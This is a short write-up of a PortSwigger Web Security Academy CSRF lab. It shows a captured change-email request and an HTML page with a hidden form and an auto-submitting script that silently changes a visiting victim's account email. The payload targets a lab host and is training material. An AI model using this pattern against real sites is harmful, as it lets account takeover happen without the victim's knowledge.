[PortSwigger Lab](https://portswigger.net/web-security/csrf/lab-no-defenses)

---

I connected on `wiener:peter` account and captured the email update `POST` form with burp

**Request**
```http
POST /my-account/change-email HTTP/2
Host: 0a3c00ce0374d58f815db1e9004f002c.web-security-academy.net
Cookie: session=G2UvYqSMtUeRAHw1xAAVLnRLz2ETSb3f
Content-Type: application/x-www-form-urlencoded

email=wiener%40normal-user.net
```

With this these information, I can craft the page to send to my victim

```html
<form action="https://0a3c00ce0374d58f815db1e9004f002c.web-security-academy.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="kiss@love.you">
</form>
<script>
document.forms[0].submit()
</script>
```

The victim just have to visit the crafted page to update his email and get replaced by `kiss@love.you`

